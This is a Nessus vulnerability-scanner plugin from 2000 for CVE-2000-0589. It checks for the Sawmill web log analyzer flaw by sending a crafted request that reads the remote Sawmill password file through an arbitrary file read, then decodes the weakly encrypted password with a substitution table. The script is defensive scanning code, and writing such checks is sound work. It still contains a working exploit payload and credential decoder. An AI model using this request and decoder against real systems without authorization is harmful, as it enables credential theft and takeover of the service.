#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10454);
 script_bugtraq_id(1403);
 script_version ("$Revision: 1.21 $");
 script_cve_id("CVE-2000-0589");
 name["english"] = "sawmill password";
 name["francais"] = "sawmill password";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
This script reads the remote sawmill password
and deciphers it.

Risk factor : High";


 desc["francais"] = "
Ce script lit le mot de passe sawmill distant et le déchiffre";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Obtains sawmill's password";
 summary["francais"] = "obtient le mot de passe sawmill";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 family["english"] = "Remote file access";
 family["francais"] = "Accès aux fichiers distants";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "sawmill.nasl", "http_version.nasl");
 script_require_keys("Sawmill/readline");
 script_require_ports("Services/www", 80, 8987);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#
include("http_func.inc");
include("http_keepalive.inc");

method = get_kb_item("Sawmill/method");

if(method == "cgi")
{
 cgi = 1;
 port = get_http_port(default:80);

}
else
{
cgi = 0;
port = 8987;
}

if(!get_port_state(port))exit(0);


foreach dir (cgi_dirs())
{
 if(cgi)
  req = string(dir, "/sawmill?rfcf+%22SawmillInfo/SawmillPassword%22+spbn+1,1,21,1,1,1,1,1,1,1,1,1+3");
 else
  req  = string("/sawmill?rfcf+%22SawmillInfo/SawmillPassword%22+spbn+1,1,21,1,1,1,1,1,1,1,1,1+3");

 req = http_get(item:req, port:port);
   
 r = http_keepalive_send_recv(port:port, data:req);
 if( r == NULL ) exit(0);
 
 r = strstr(r, "Unknown configuration");
 if(r)
 {
  end = strstr(r, "<br>");
  r = r - end;
  pattern = ".*Unknown configuration command " + raw_string(0x22) +
  	    "(.*)" + raw_string(0x22) + " in .*$";
     
  pass = ereg_replace(string:r,  pattern:pattern, replace:"\1");
 
  
  #
  # Code from Larry W. Cashdollar
  #
  clear = "";
  len = strlen(pass);
  alpha  = 
  	  "abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+~<>?:"+raw_string(0x22, 0x7B, 0x7D) +"|";

  encode =
  	  "=GeKMNQS~TfUVWXY"+raw_string(0x5B)+"abcygimrs"+raw_string(0x22)+"#$&-"+raw_string(0x5D)+"FLq4.@wICH2!oEn"+raw_string(0x7D)+
  	   "Z%(Ovt"+raw_string(0x7B)+"z";
 
  for (x = 0; x < len; x = x+1)
    {

      for (y = 0; y < strlen (encode); y=y+1)
        if (pass[x] == encode[y])
          clear = clear + alpha[y];

    }
  
  report = string("The sawmill password seems to be '") + clear +
  	   string("'\nWe could guess it thanks to the fact that sawmill allows\n",
	          "the reading of arbitrary files and to the weak encryption algorithm\n",
		  "used by this software. An attacker can use this password to reconfigure\n",
		  "your sawmill daemon.\n\n",
		  "Solution : upgrade\n",
		  "Risk factor : High");
 security_hole(port:port, data:report);		  
  
 }
}
